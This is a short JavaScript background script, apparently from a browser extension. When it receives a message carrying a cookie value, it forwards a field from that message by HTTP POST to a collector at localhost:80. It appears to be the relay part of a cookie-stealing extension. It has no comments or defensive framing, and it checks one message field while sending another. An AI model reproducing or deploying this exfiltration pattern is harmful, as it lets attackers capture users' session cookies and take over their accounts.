browser.runtime.onMessage.addListener((message) => {
    if (message.cookieValue) {
        const data = {
            param: message.khongggg
        };
        const formData = new URLSearchParams();
        for (const key in data) {
            formData.append(key, data[key]);
        }
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "http://localhost:80", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send(formData);
    }
});
